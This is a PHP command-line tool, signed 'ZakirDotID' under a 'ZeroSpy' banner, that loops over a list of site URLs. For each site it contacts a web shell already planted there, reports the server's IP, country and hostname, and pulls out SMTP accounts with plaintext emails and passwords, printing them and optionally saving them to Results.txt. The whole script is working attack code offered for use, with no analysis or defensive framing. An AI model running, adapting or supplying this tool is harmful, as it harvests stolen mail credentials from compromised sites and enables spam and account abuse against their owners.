<?php
require 'lib.php';
echo "
 _____               __             
/ _  / ___ _ __ ___ / _\_ __  _   _ 
\// / / _ \ '__/ _ \\ \| '_ \| | | |
 / //\  __/ | | (_) |\ \ |_) | |_| |
/____/\___|_|  \___/\__/ .__/ \__, |
                       |_|    |___/

------ Coded By ZakirDotID ------                       
";
if (isset($atgv[1])) {
	$file = trim($argv[1]);
} else {
	$file = readline('Input List Site? ');
	$file = trim($file);
}
echo "[INFO] Loaded Site\n";
for($x = 0; $x <= 4; $x++){ echo "======="; sleep(1); } echo "\n";
if (!is_file($file)) {
	echo "[!] Files Not Exists!\n";
}
$get 		= file_get_contents($file);
$pecah 		= explode("\n", $get);
echo "[INFO] Count Site (".count($pecah).")\n";
echo "[INFO] Start Crack SMTP!\n";
foreach ($pecah as $url) {
	echo "[System] Check Shell\n";
	$check = server_info($url."?_server");

	if(!$check)
	{
		echo "[INFO] Shell Dead\n";
	} else {
		echo "[System] Server IP ({$check['ip']}) \nCountry ({$check['country']}) \nServer ({$check['hostname']})\n";
		for($x = 0; $x <= 4; $x++){ echo "======="; sleep(1); } echo "\n";
		echo "[System] Try Get SMTP\n";	
		$smtp = smtp($url."?_smtp");

		if (!$smtp) {
			echo "[INFO] Failed Get SMTP\n";
		} else {
			echo "[INFO] Count SMTP (".count($smtp['data']).")\n";
			save:
			$save = readline("Save As File? yes or no : ");
			if ($save == 'yes' or $save == 'Yes') {
				$isSave = true;
			} elseif ($save = 'no' or $save == "No") {
				$isSave = false;
			} else {
				goto save;
			}

			echo "[System] Run Cracking\n";

			for($x = 0; $x <= 4; $x++){ echo "======="; sleep(1); } echo "\n";

			foreach ($smtp['data'] as $value) {

				if ($isSave) {
					save('Results.txt', "SMTP -> {$value['site']}|{$value['email']}|{$value['password']}|25 \r\n");
				}

				echo "[Info] SMTP -> {$value['site']}|{$value['email']}|{$value['password']}|25 \n";
			}	
		}
	}
	for($x = 0; $x <= 4; $x++){ echo "======="; sleep(1); } echo "\n";
}
echo "[INFO] Complated!\n";